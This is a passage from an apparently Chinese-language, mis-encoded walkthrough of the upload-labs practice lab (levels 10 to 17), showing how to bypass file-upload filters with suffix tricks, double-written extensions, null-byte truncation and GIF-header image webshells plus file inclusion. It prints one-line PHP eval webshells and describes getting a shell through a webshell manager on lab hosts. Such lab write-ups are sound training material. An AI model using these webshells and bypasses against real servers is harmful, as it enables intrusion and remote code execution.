è¿™ä¸€å…³é»‘åå•ï¼Œæœ€åä¸Šä¼ è·¯å¾„ç›´æ¥ä½¿ç”¨æ–‡ä»¶åè¿›è¡Œæ‹¼æ¥ï¼Œè€Œä¸”åªå¯¹æ–‡ä»¶åè¿›è¡Œ
<code>filename=deldot(file_name)</code>æ“ä½œå»é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œæ„é€ åç¼€ç»•è¿‡é»‘åå•

<code>deldot()</code>å‡½æ•°ä»åå‘å‰æ£€æµ‹ï¼Œå½“æ£€æµ‹åˆ°æœ«å°¾çš„ç¬¬ä¸€ä¸ªç‚¹æ—¶ä¼šç»§ç»­å®ƒçš„æ£€æµ‹ï¼Œä½†æ˜¯é‡åˆ°ç©ºæ ¼ä¼šåœä¸‹æ¥



+ ç¼–å†™è„šæœ¬<code>TenFirstMethod.php</code>

~~~ shell
<?php phpinfo(); ?>
~~~

![Pass10_3](./img/Pass10_3.png)



+ ä¸Šä¼ è„šæœ¬<code>TenFirstMethod.php</code>

![Pass10_5](./img/Pass10_5.png)



+ ç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶ä¿®æ”¹æ–‡ä»¶å<code>TenFirstMethod.php</code>ä¸º<code>TenFirstMethod.php. .</code>

![Pass10_6](./img/Pass10_6.PNG)

![Pass10_7](./img/Pass10_7.png)



+ å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸç»•è¿‡ï¼Œæ–‡ä»¶<code>TenFirstMethod.php</code>æˆåŠŸä¸Šä¼ 

![Pass10_8](./img/Pass10_8.png)



+ å³é”®æ‰“å¼€æ–‡ä»¶<code>TenFirstMethod.php</code>

![Pass10_9](./img/Pass10_9.png)



+ å¯ä»¥çœ‹åˆ°æ–‡ä»¶<code>TenFirstMethod.php</code>æˆåŠŸæ‰§è¡Œä»£ç 

![Pass10_10](./img/Pass10_10.PNG)



### æ–¹æ³•äºŒ

+ ç¼–è¾‘è„šæœ¬<code>TenSecondMethod.php</code>

~~~ shell
<?php @eval($_POST['TenSecond']); ?>
~~~

![Pass10_4](./img/Pass10_4.png)



+ ä¸Šä¼ æ–‡ä»¶<code>TenSecondMethod.php</code>

![Pass10_11](./img/Pass10_11.PNG)



+ ç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶å°†æ–‡ä»¶å<code>TenSecondMethod.php</code>æ”¹ä¸º<code>TenSecondMethod.php. .</code>

![Pass10_12](./img/Pass10_12.png)

![Pass10_13](./img/Pass10_13.png)



+ å³é”®æ‰“å¼€ä¸Šä¼ çš„æ–‡ä»¶<code>TenSecondMethod.php</code>

![Pass10_14](./img/Pass10_14.png)



+ å¤åˆ¶å·²ç»æ‰“å¼€çš„æ–‡ä»¶<code>TenSecondMethod.php</code>çš„ç½‘å€

![Pass10_15](./img/Pass10_15.png)



+ ç”¨èšå‰‘æ·»åŠ æ•°æ®å¹¶é…ç½®

![Pass10_16](./img/Pass10_16.png)



+ æ·»åŠ æ•°æ®æˆåŠŸ

![Pass10_17](./img/Pass10_17.png)



+ åŒå‡»æ·»åŠ çš„æ•°æ®ï¼Œ<code>getshell</code>æˆåŠŸ

![Pass10_18](./img/Pass10_18.PNG)



## Pass11

### æ–¹æ³•ä¸€

+ é¦–å…ˆæŸ¥çœ‹æç¤º

![Pass11_1](./img/Pass11_1.PNG)



+ æŸ¥çœ‹æºç 

![Pass11_2](./img/Pass11_2.PNG)

è¿™ä¸€å…³é»‘åå•ç”¨<code>str_ireplace()</code>å‡½æ•°å¯»æ‰¾æ–‡ä»¶åä¸­å­˜åœ¨çš„é»‘åå•å­—ç¬¦ä¸²å°†å®ƒæ›¿æ¢æˆç©ºï¼Œå¯ç”¨åŒå†™ç»•è¿‡é»‘åå•



+ ç¼–å†™è„šæœ¬<code>ElevenFirstMethod.php</code>

![Pass11_4](./img/Pass11_4.PNG)



+ ä¸Šä¼ è„šæœ¬æ–‡ä»¶<code>ElevenFirstMethod.php</code>

![Pass11_6](./img/Pass11_6.PNG)



+ ä½¿ç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶å°†è„šæœ¬æ–‡ä»¶<code>ElevenFirstMethod.php</code>çš„åç¼€<code>.php</code>æ”¹ä¸º<code>.pphphp</code>

![Pass11_7](./img/Pass11_7.png)

![Pass11_8](./img/Pass11_8.png)



+ æœ€ç»ˆæˆåŠŸä¸Šä¼ è„šæœ¬æ–‡ä»¶<code>ElevenFirstMethod.php</code>å¹¶å³é”®æ‰“å¼€è„šæœ¬æ–‡ä»¶<code>ElevenFirstMethod.php</code>

![Pass11_9](./img/Pass11_9.png)



+ æˆåŠŸæ‰§è¡Œè„šæœ¬æ–‡ä»¶<code>ElevenFirstMethod.php</code>

![Pass11_10](./img/Pass11_10.PNG)





### æ–¹æ³•äºŒ

+ æŸ¥çœ‹æç¤º

![Pass11_1](./img/Pass11_1.PNG)



+ æŸ¥çœ‹æºä»£ç 

![Pass11_2](./img/Pass11_2.PNG)



+ ç¼–è¾‘è„šæœ¬æ–‡ä»¶<code>ElevenSecondMethod.php</code>

![Pass11_11](./img/Pass11_11.png)



+ ä¸Šä¼ è„šæœ¬æ–‡ä»¶<code>ElevenSecondMethod.php</code>

![Pass11_12](./img/Pass11_12.png)



+ åŒæ ·ç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶å°†è„šæœ¬æ–‡ä»¶<code>ElevenSecondMethod.php</code>çš„åç¼€<code>.php</code>æ”¹ä¸º<code>.pphphp</code>

![Pass11_13](./img/Pass11_13.png)

![Pass11_14](./img/Pass11_14.png)



+  æˆåŠŸä¸Šä¼ æ–‡ä»¶<code>ElevenSecondMethod.php</code>å¹¶å³é”®æ‰“å¼€

![Pass11_15](./img/Pass11_15.png)



+ æˆåŠŸæ‰“å¼€ä¸Šä¼ çš„è„šæœ¬æ–‡ä»¶<code>ElevenSecondMethod.php</code>åŒæ—¶å¤åˆ¶è„šæœ¬æ–‡ä»¶çš„ç½‘å€

~~~ shell
Â http://192.168.12.55:8080/upload-labs/upload/ElevenSecondMethod.php
~~~

![Pass11_16](./img/Pass11_16.png)



+ ç”¨èšå‰‘æ·»åŠ æ•°æ®å¹¶é…ç½®ï¼›<code>URLåœ°å€</code>å¡«å†™ä¸Šä¼ æ–‡ä»¶çš„ç½‘å€ï¼Œ<code>è¿æ¥å¯†ç </code>æ ¹æ®è„šæœ¬<code>ElevenSecondMethod.php</code>é‡Œçš„æ•°æ®å¡«å†™

![Pass11_17](./img/Pass11_17.PNG)



+ æœ€ç»ˆæˆåŠŸ<code>getshell</code>ï¼Œæ·»åŠ æ•°æ®æˆåŠŸ

![Pass11_18](./img/Pass11_18.PNG)



+ åŒå‡»æ·»åŠ åˆ°çš„æ•°æ®ï¼ŒæˆåŠŸè¿æ¥

![Pass11_19](./img/Pass11_19.PNG)



## Pass12

### æ–¹æ³•ä¸€

+ é¦–å…ˆæŸ¥çœ‹æç¤º

![Pass12_1](./img/Pass12_1.PNG)



+ æŸ¥çœ‹æºä»£ç ï¼Œå…³é”®ä»£ç æ˜¯è¿™å¥

![Pass12_2](./img/Pass12_2.png)

~~~ shell
urlä¸­çš„%00ï¼ˆåªè¦æ˜¯è¿™ç§%xxï¼‰çš„å½¢å¼ï¼Œwebserverä¼šæŠŠå®ƒå½“ä½œåå…­è¿›åˆ¶å¤„ç†ï¼Œç„¶åæŠŠ16è¿›åˆ¶çš„hexè‡ªåŠ¨ç¿»è¯‘æˆasciiç å€¼â€œNULLâ€,å®ç°äº†æˆªæ–­burpsuiteä¸­16è¿›åˆ¶ç¼–è¾‘å™¨å°†ç©ºæ ¼20æ”¹æˆäº†00;
æœ¬è´¨ä¸Šæ¥è¯´ï¼Œéƒ½æ˜¯åˆ©ç”¨0x00æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è¯†ç¬¦ï¼Œè¿›è¡Œæˆªæ–­å¤„ç†;
åªä¸è¿‡GETä¼ å‚éœ€è¦urlç¼–ç æˆ%00è€Œå·²;
åŸç†ï¼šphpçš„ä¸€äº›å‡½æ•°çš„åº•å±‚æ˜¯Cè¯­è¨€ï¼Œè€Œmove_uploaded_fileå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼Œ0xè¡¨ç¤º16è¿›åˆ¶ï¼ŒURLä¸­%00è§£ç æˆ16è¿›åˆ¶å°±æ˜¯0x00ã€‚
~~~

~~~ tex
%00æˆªæ–­
%00çš„ä½¿ç”¨æ˜¯åœ¨è·¯å¾„ä¸Šï¼
%00çš„ä½¿ç”¨æ˜¯åœ¨è·¯å¾„ä¸Šï¼
%00çš„ä½¿ç”¨æ˜¯åœ¨è·¯å¾„ä¸Šï¼
é‡è¦çš„è¯è¯´ä¸‰éã€‚å¦‚æœåœ¨æ–‡ä»¶åä¸Šä½¿ç”¨ï¼Œå°±æ— æ³•æ­£å¸¸æˆªæ–­äº†ã€‚å¦‚ï¼šaaa.php%00bbb.jpg
~~~

~~~ tex
00æˆªæ–­çš„é™åˆ¶æ¡ä»¶æ˜¯PHP<5.3.29ï¼Œä¸”GPCå…³é—­
å› ä¸ºå½“ magic_quotes_gpc æ‰“å¼€æ—¶ï¼Œæ‰€æœ‰çš„ ' (å•å¼•å·), " (åŒå¼•å·), \ (åæ–œçº¿) and ç©ºå­—ç¬¦ä¼šè‡ªåŠ¨è½¬ä¸ºå«æœ‰åæ–œçº¿çš„è½¬ä¹‰å­—ç¬¦ã€‚
magic_quotes_gpc ç€é‡åå‘æ•°æ®åº“æ–¹é¢ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ï¼Œä½†magic_quotes_gpcå¼€å¯è¿˜ä¼šå¯¹$_REQUEST, $_GET,$_POST,$_COOKIE è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤
~~~



<code>save_path</code>æ˜¯ä¸€ä¸ªå¯æ§çš„å˜é‡ï¼Œåé¢è¿˜æœ‰ä¸€ä¸ªåç¼€åéœ€è¦ç»•è¿‡ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦ä½¿ç”¨<code>%00</code>æˆªæ–­ï¼Œä¸è¿‡è¿™ä¸ªä¸œè¥¿å·²ç»æ˜¯æ—§æ—¶ä»£çš„äº§ç‰©çš„ï¼Œæ‰€ä»¥æœ‰ä½¿ç”¨æ¡ä»¶

~~~ shell
phpç‰ˆæœ¬å°äº5.3.4
phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€
~~~



+ ç¼–è¾‘è„šæœ¬æ–‡ä»¶<code>TwelveFirstMethod.php</code>

![Pass12_3](./img/Pass12_3.PNG)



+ æ»¡è¶³æ¡ä»¶åä¸Šä¼ è„šæœ¬æ–‡ä»¶<code>TwelveFirstMethod.php</code>ç„¶åä¸Šä¼ ï¼Œç”¨<code>burpsuite</code>æ‹¦æˆª

![Pass12_5](./img/Pass12_5.PNG)



+ å°†è¯·æ±‚çš„è¿™ä¸¤ä¸ªåœ°æ–¹ä¿®æ”¹

![Pass12_8](./img/Pass12_8.png)



+ ç”±äºæ¡ä»¶ä¸æ»¡è¶³è¦æ±‚ï¼Œä¸»è¦æ˜¯<code>php<code>ç‰ˆæœ¬ä¸æ»¡è¶³è¦æ±‚ï¼Œæ‰€ä»¥æœ€ç»ˆå¾—ä¸åˆ°æƒ³è¦çš„ç»“æœ

![Pass12_7](./img/Pass12_7.PNG)



+ è¿™ä¸ªæ¡ˆä¾‹æ²¡æœ‰å¤ªå¤§çš„å‚è€ƒä»·å€¼ï¼Œç›´æ¥è·³è¿‡ã€‚ã€‚ã€‚



## Pass13

### æ–¹æ³•ä¸€

+ é¦–å…ˆæŸ¥çœ‹æç¤º

![Pass13_1](./img/Pass13_1.png)



+ æŸ¥çœ‹ä»£ç 

![Pass13_2](./img/Pass13_2.PNG)



+ ç¼–å†™è„šæœ¬<code>ThirteenFirstMethod.php</code>

~~~ shell
<?php phpinfo(); ?>
~~~

![Pass13_3](./img/Pass13_3.PNG)



+ ä¸Šä¼ è„šæœ¬<code>ThirteenFirstMethod.php</code>

![Pass13_5](./img/Pass13_5.PNG)



+ ç”¨<code>burpsuite</code>æ‹¦æˆªä¸Šä¼ è„šæœ¬<code>ThirteenFirstMethod.php</code>

![Pass13_6](./img/Pass13_6.PNG)



+ ä¿®æ”¹<code>URL</code>ç½‘å€å’Œæ–‡ä»¶åå¦‚ä¸‹

![Pass13_7](./img/Pass13_7.png)



+ é€‰ä¸­<code>%00</code>ï¼Œå¹¶å³é”®é€‰ä¸­è½¬æ¢ï¼Œè¿›è¡Œç½‘å€è½¬æ¢<code>decode</code>

![Pass13_8](./img/Pass13_8.PNG)



+ æ˜¾ç¤ºä¸Šä¼ å¤±è´¥ï¼Œåº”è¯¥æ˜¯ç‰ˆæœ¬æ¡ä»¶ä¸æ»¡è¶³

~~~ shell
éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶:
	phpç‰ˆæœ¬å°äº5.3.4
	phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€	
~~~

![Pass13_9](./img/Pass13_9.png)



+ æŒ‘æˆ˜å¤±è´¥



## Pass14

### æ–¹æ³•ä¸€

+ æŸ¥çœ‹æç¤º

![Pass14_1](./img/Pass14_1.png)



+ æŸ¥çœ‹æºä»£ç ï¼Œç”±æ­¤å¯åˆ¤æ–­è¿™å…³ä¼šè¯»å–åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚ï¼Œåˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼Œå¹¶ä¸”åç«¯ä¼šæ ¹æ®åˆ¤æ–­å¾—åˆ°çš„æ–‡ä»¶ç±»å‹é‡å‘½åä¸Šä¼ æ–‡ä»¶ï¼Œä½¿ç”¨ `å›¾ç‰‡é©¬ + æ–‡ä»¶åŒ…å«` ç»•è¿‡

~~~ shell
è¡¥å……çŸ¥è¯†ï¼š
1.Pngå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬8å­—èŠ‚ï¼š89 50 4E 47 0D 0A 1A 0Aã€‚å³ä¸º .PNGã€‚
2.Jpgå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼šFF D8ã€‚
3.Gifå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬6å­—èŠ‚ï¼š47 49 46 38 39|37 61 ã€‚å³ä¸º GIF 89(7)aã€‚
4.Bmpå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼š42 4Dã€‚å³ä¸º BMã€‚
~~~

![Pass14_2](./img/Pass14_2.PNG)



+ ç¼–å†™è„šæœ¬æ–‡ä»¶<code>FourteenFirstMethod.php</code>ï¼Œåœ¨ä¸€å¥è¯æœ¨é©¬å‰åŠ ä¸Šä¸‹é¢è¿™å¥ä»£ç 

~~~ shell
GIF 89A
~~~

![Pass14_3](./img/Pass14_3.PNG)



+ ä¸Šä¼ è„šæœ¬æ–‡ä»¶<code>FourteenFirstMethod.php</code>ï¼Œç”±äºä¸Šä¸€æ­¥ä»£ç çš„æ·»åŠ è„šæœ¬æ–‡ä»¶<code>FourteenFirstMethod.php</code>ä¼šè¢«è§£æä¸º<code>gif</code>æ–‡ä»¶

![Pass14_5](./img/Pass14_5.PNG)

![Pass14_6](./img/Pass14_6.PNG)



+ å³é”®æ‰“å¼€ä¸Šä¼ çš„è„šæœ¬æ–‡ä»¶<code>FourteenFirstMethod.php</code>ï¼Œç„¶åå¤åˆ¶æ‰“å¼€æ–‡ä»¶å¯¹åº”çš„ç½‘å€

![Pass14_7](./img/Pass14_7.png)

![Pass14_8](./img/Pass14_8.png)



+ è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å†™ä¸€ä¸ª<code>include.php</code>ä¼ å…¥å†è§£æå›¾ç‰‡æ‰èƒ½æ‰§è¡Œæœ¨é©¬ï¼Œåœ¨è¿™é‡Œæ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´é“¾æ¥

![Pass14_9](./img/Pass14_9.png)



+ é‡æ–°æ„é€ <code>URL</code>ï¼Œåœ¨æ–‡ä»¶åŒ…å«æ¼æ´çš„ç½‘å€ååŠ ä¸Šä¼ å›¾ç‰‡é©¬çš„ç½‘å€

~~~ shell
http://192.168.104.55:8080/upload-labs/include.php(æ–‡ä»¶æ¼æ´)?file=upload/2620240211021030.gif(å›¾ç‰‡é©¬)
~~~

![Pass14_10](./img/Pass14_10.png)



+ æœ€åå›è½¦ï¼Œä»£ç æˆåŠŸæ‰§è¡Œ

![Pass14_11](./img/Pass14_11.PNG)



### æ–¹æ³•äºŒ

+ ç¼–å†™è„šæœ¬æ–‡ä»¶<code>FourteenSecondMethod.php</code>ï¼Œåœ¨ä¸€å¥è¯æœ¨é©¬å‰åŠ ä¸Š<code>GIF 89A</code>

~~~ shell
GIF 89A
<?php @eval($_POST['FourteenSecond']); ?>
~~~

![Pass14_4](./img/Pass14_4.PNG)



+ ä¸Šä¼ è„šæœ¬æ–‡ä»¶<code>FourteenSecondMethod.php</code>

![Pass14_12](./img/Pass14_12.PNG)



+ ç”±äºç¬¬ä¸€æ­¥åŠ ä¸Šçš„ä»£ç <code>GIF 89A</code>ï¼Œä¸Šä¼ çš„æ–‡ä»¶<code>FourteenSecondMethod.php</code>ä¼šè¢«è§£æä¸º<code>GIF</code>æ–‡ä»¶

![Pass14_13](./img/Pass14_13.PNG)



+ å³é”®æ‰“å¼€<code>GIF</code>æ–‡ä»¶

![Pass14_14](./img/Pass14_14.png)



+ å¤åˆ¶æ‰“å¼€<code>GIF</code>æ–‡ä»¶ç½‘å€

![Pass14_15](./img/Pass14_15.png)



+ åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´

![Pass14_16](./img/Pass14_16.png)



+ é‡æ–°æ„é€ <code>URL</code>ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ç½‘å€ååŠ ä¸Šå›¾ç‰‡é©¬çš„æ–‡ä»¶ä½ç½®

~~~ shell
URL=http://192.168.104.55:8080/upload-labs/include.php(æ–‡ä»¶åŒ…å«æ¼æ´)?file=upload/2620240211021030.gif(å›¾ç‰‡é©¬ä½ç½®)
~~~

![Pass14_17](./img/Pass14_17.png)



+ å›è½¦ï¼Œæ–‡ä»¶æˆåŠŸæ‰§è¡Œ

![Pass14_18](./img/Pass14_18.PNG)



+ æ‰“å¼€èšå‰‘ï¼Œæ·»åŠ é…ç½®æ•°æ®å¦‚ä¸‹ï¼ŒURLåœ°å€ä¸ºæ–‡ä»¶åŒ…å«æ¼æ´ç½‘å€ååŠ å›¾ç‰‡é©¬çš„æ–‡ä»¶ä½ç½®ï¼Œè¿æ¥å¯†ç æ ¹æ®å›¾ç‰‡é©¬è€Œè®¾ç½®

![Pass14_20](./img/Pass14_20.PNG)



+ é…ç½®æ•°æ®åè¿æ¥æˆåŠŸï¼ŒæˆåŠŸ<code>getshell</code>

![Pass14_19](./img/Pass14_19.PNG)

![Pass14_21](./img/Pass14_21.PNG)



## Pass15

### æ–¹æ³•ä¸€

+ æŸ¥çœ‹æç¤º

![Pass15_1](./img/Pass15_1.PNG)



+ æŸ¥çœ‹æºä»£ç 

~~~ shell
getimagesize()å‡½æ•°ï¼š
- å¯¹ç›®æ ‡çš„åå…­è¿›åˆ¶çš„å‰å‡ ä¸ªå­—ç¬¦ä¸²è¯»å–ã€‚æ¯”å¦‚GIFçš„æ–‡ä»¶å¤´é—®GIF89aï¼Œpngçš„æ–‡ä»¶å¤´ä¸ºå¡’NGï¼Œç„¶åè¿”å›ä¸€ä¸ªå…·æœ‰å››ä¸ªå•å…ƒçš„æ•°ç»„;
- ç´¢å¼•0åŒ…å«å›¾åƒå®½åº¦çš„åƒç´ å€¼;
- ç´¢å¼•1åŒ…å«å›¾åƒé«˜åº¦çš„åƒç´ å€¼;
- ç´¢å¼•2æ˜¯å›¾åƒç±»å‹çš„æ ‡è®°ï¼š1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 = BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBMã€‚è¿™äº›æ ‡è®°ä¸ PHP 4.3.0 æ–°åŠ çš„ IMAGETYPE å¸¸é‡å¯¹åº”;
- ç´¢å¼•3æ˜¯æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œå†…å®¹ä¸º"height="yyy" width="xxx""ï¼Œå¯ç›´æ¥ç”¨äº IMG æ ‡è®°;
~~~

![Pass15_2](./img/Pass15_2.PNG)



+ ç¼–å†™è„šæœ¬<code>FifthteenFirstMethod.php</code>

~~~ shell
è®°äº‹æœ¬æ‰“å¼€ä»£ç æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¤´æ·»åŠ GIF 89Aåˆ™æ–‡ä»¶ä¼šè¢«è§£æä¸ºGIFå›¾åƒ
~~~

![Pass15_3](./img/Pass15_3.PNG)



+ ä¸Šä¼ è„šæœ¬<code>FifthteenFirstMethod.php</code>

![Pass15_5](./img/Pass15_5.PNG)



+ ç‚¹å‡»ä¸Šä¼ åä¸Šä¼ æˆåŠŸ

![Pass15_6](./img/Pass15_6.PNG)



+ å³é”®åœ¨æ–°çš„æ ‡ç­¾é¡µæ‰“å¼€å›¾åƒ

![Pass15_7](./img/Pass15_7.png)



+ æˆåŠŸåœ¨æ–°çš„æ ‡ç­¾é¡µæ‰“å¼€<code>GIF</code>å›¾åƒï¼Œå¤åˆ¶å¯¹åº”çš„<code>GIF</code>å›¾åƒç½‘å€

![Pass15_8](./img/Pass15_8.png)



+ åœ¨è¿™é‡Œæ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´åœ°å€

![Pass15_9](./img/Pass15_9.png)



+ æ–‡ä»¶åŒ…å«æ¼æ´çš„ç½‘å€

![Pass15_10](./img/Pass15_10.png)



+ åœ¨åé¢åŠ ä¸Š<code>?file=æ–‡ä»¶åœ°å€</code>

![Pass15_11](./img/Pass15_11.png)



+ ç‚¹ç¡®å®šï¼Œå‘½ä»¤æˆåŠŸæ‰§è¡Œ

![Pass15_12](./img/Pass15_12.PNG)



###  æ–¹æ³•äºŒ

+ ç¼–å†™è„šæœ¬<code>FifthteenSecondMethod.php</code>

![Pass15_13](./img/Pass15_13.PNG)



+ ç‚¹å‡»ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸ

![Pass15_14](./img/Pass15_14.PNG)



+ å³é”®åœ¨æ–°çš„æ ‡ç­¾é¡µæ‰“å¼€å›¾åƒ

![Pass15_15](./img/Pass15_15.PNG)



+ æˆåŠŸåœ¨æ–°çš„æ ‡ç­¾é¡µæ‰“å¼€<code>GIF</code>å›¾åƒæ–‡ä»¶ï¼Œå¤åˆ¶å›¾åƒçš„åœ°å€

![Pass15_16](./img/Pass15_16.png)



+ æ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´

![Pass15_17](./img/Pass15_17.png)



+ åœ¨æ–°çš„æ ‡ç­¾é¡µæˆåŠŸæ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´ç½‘é¡µ

![Pass15_18](./img/Pass15_18.PNG)



+ åœ¨æ–‡ä»¶æ¼æ´ç½‘å€ååŠ ä¸Š<code>?file=GIFæ–‡ä»¶åœ°å€</code>

![Pass15_19](./img/Pass15_19.PNG)



+ åœ¨èšå‰‘æ·»åŠ å¹¶é…ç½®æ•°æ®å¦‚ä¸‹ï¼Œç½‘å€æ›¿æ¢æˆè‡ªå·±ç”µè„‘å¯¹åº”çš„<code>IP</code>

![Pass15_20](./img/Pass15_20.PNG)



+ æˆåŠŸæ·»åŠ æ•°æ®

![Pass15_21](./img/Pass15_21.PNG)



+ åŒå‡»æ‰“å¼€ç½‘é¡µé“¾æ¥ï¼ŒæˆåŠŸ<code>getshell</code>

![Pass15_22](./img/Pass15_22.PNG)



## Pass16

### æ–¹æ³•ä¸€

+ æŸ¥çœ‹æç¤º

![Pass16_1](./img/Pass16_1.PNG)



+ çŸ¥è¯†è¡¥å……ï¼š<code>exif_imagetype()</code>å‡½æ•°

~~~ tex
çŸ¥è¯†è¡¥å……ï¼š exif_imagetype()è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶åç¼€å;
è¿”å›å€¼ä¸getimagesize()å‡½æ•°è¿”å›çš„ç´¢å¼•2ç›¸åŒï¼Œä½†æ˜¯é€Ÿåº¦æ¯”getimagesize()å¿«å¾—å¤šï¼ŒåŒæ—¶è¦å¼€å¯php_exifæ¨¡å—;
~~~

![Pass16_23](./img/Pass16_23.png)



+ æŸ¥çœ‹æºä»£ç 

![Pass16_2](./img/Pass16_2.PNG)



+ ç¼–å†™è„šæœ¬<code>SixteenFirstMethod.php</code>

![Pass16_3](./img/Pass16_3.PNG)



+ ä¸Šä¼ è„šæœ¬<code>SixteenFirstMethod.php</code>åˆ°ä¸Šä¼ ç‚¹

![Pass16_5](./img/Pass16_5.PNG)



+ ç‚¹å‡»ä¸Šä¼ ï¼Œå‘ç°é¡µé¢è¢«è¦†ç›–å¦‚ä¸‹

![Pass16_6](./img/Pass16_6.PNG)



+ å¼€å¯<code>phpstudy</code>çš„<code>php_exif</code>æ¨¡å—

![Pass16_7](./img/Pass16_7.PNG)



+ é‡æ–°ä¸Šä¼ è„šæœ¬<code>SixteenFirstMethod.php</code>ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸ

![Pass16_8](./img/Pass16_8.PNG)



+ å³é”®åœ¨æ–°çš„é¡µé¢æ‰“å¼€å›¾ç‰‡é“¾æ¥

![Pass16_9](./img/Pass16_9.png)



+ æˆåŠŸåœ¨æ–°çš„é¡µé¢æ‰“å¼€å›¾ç‰‡é“¾æ¥ï¼ŒåŒæ—¶å¤åˆ¶å›¾ç‰‡é“¾æ¥çš„åœ°å€

![Pass16_10](./img/Pass16_10.png)



+ æ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢

![Pass16_11](./img/Pass16_11.png)



+ æˆåŠŸæ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢

![Pass16_12](./img/Pass16_12.png)



+ åœ¨æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢çš„ç½‘å€ååŠ ä¸Š<code>?file=å›¾ç‰‡ç½‘å€</code>ï¼ŒæˆåŠŸæ‰§è¡Œè„šæœ¬å‘½ä»¤

![Pass16_13](./img/Pass16_13.png)



### æ–¹æ³•äºŒ

+ ç¼–å†™è„šæœ¬<code>SixteenSecondMethod.php</code>

![Pass16_4](./img/Pass16_4.PNG)



+ ä¸Šä¼ è„šæœ¬<code>SixteenSecondMethod.php</code>åˆ°æ³¨å…¥ç‚¹

![Pass16_14](./img/Pass16_14.PNG)



+ ç‚¹å‡»ä¸Šä¼ ï¼ŒæˆåŠŸä¸Šä¼ è„šæœ¬æ–‡ä»¶<code>SixteenSecondMethod.php</code>å¹¶è¢«è§£æä¸º<code>GIF</code>å›¾åƒ

![Pass16_15](./img/Pass16_15.PNG)



+ å³é”®ç‚¹å‡»ï¼Œåœ¨æ–°çš„é¡µé¢æ‰“å¼€å›¾åƒ

![Pass16_16](./img/Pass16_16.png)



+ æˆåŠŸåœ¨æ–°çš„é¡µé¢æ‰“å¼€å›¾åƒï¼Œå¤åˆ¶å›¾åƒçš„ç½‘å€

![Pass16_17](./img/Pass16_17.png)



+ æ‰“å¼€æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢

![Pass16_18](./img/Pass16_18.png)



+ åœ¨æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ç½‘å€ååŠ ä¸Šåç¼€<code>?file=å›¾ç‰‡ç½‘å€</code>ï¼Œæ–‡ä»¶ä»£ç æˆåŠŸæ‰§è¡Œ 

![Pass16_19](./img/Pass16_19.png)



+ æ‰“å¼€èšå‰‘ï¼Œæ·»åŠ æ•°æ®å¹¶é…ç½®ï¼Œ<code>URL</code>åœ°å€ä¸ºæ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢ç½‘å€åŠ ä¸Š<code>?file=å›¾ç‰‡ç½‘å€</code>ï¼Œè€Œè¿æ¥å¯†ç åˆ™ç”±è„šæœ¬<code>SixteenSecondMethod.php</code>å†³å®š

![Pass16_20](./img/Pass16_20.PNG)



+ æˆåŠŸæ·»åŠ æ•°æ®

![Pass16_21](./img/Pass16_21.PNG)



+ åŒå‡»æ·»åŠ çš„æ•°æ®ï¼ŒæˆåŠŸ<code>getshell</code>

![Pass16_22](./img/Pass16_22.PNG)



## Pass17

+ [æ–‡ä»¶ä¸Šä¼ ç»•è¿‡â€”äºŒæ¬¡æ¸²æŸ“æ¼æ´](https://blog.csdn.net/weixin_45588247/article/details/119177948)

+ [ æ–‡ä»¶ä¸Šä¼ ç»•è¿‡â€”æ¡ä»¶ç«äº‰æ¼æ´](https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501)



+ é¦–å…ˆæŸ¥çœ‹æç¤º

![Pass17_01](./img/Pass17_01.PNG)



+ æŸ¥çœ‹æºä»£ç ï¼Œæºä»£ç å¦‚ä¸‹

~~~ shell
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
